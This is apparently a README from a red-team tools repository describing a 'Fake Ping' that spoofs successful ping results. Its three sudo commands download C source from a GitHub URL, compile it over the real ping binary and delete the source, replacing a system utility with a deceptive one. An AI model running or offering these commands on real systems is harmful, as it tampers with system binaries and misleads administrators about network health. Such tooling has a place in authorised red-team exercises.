## Fake Ping 

Can replace the real ping utility, the typical flags work.

This will always spoof successful results **for valid hosts** (all IP addresses, valid DNS addresses).

```
sudo wget "https://raw.githubusercontent.com/JackDunfey/Red-Team-Tools/refs/heads/main/ping/ping.c" -O "/tmp/ping.c"
sudo gcc /tmp/ping.c -o $(which ping)
sudo rm /tmp/ping.c
```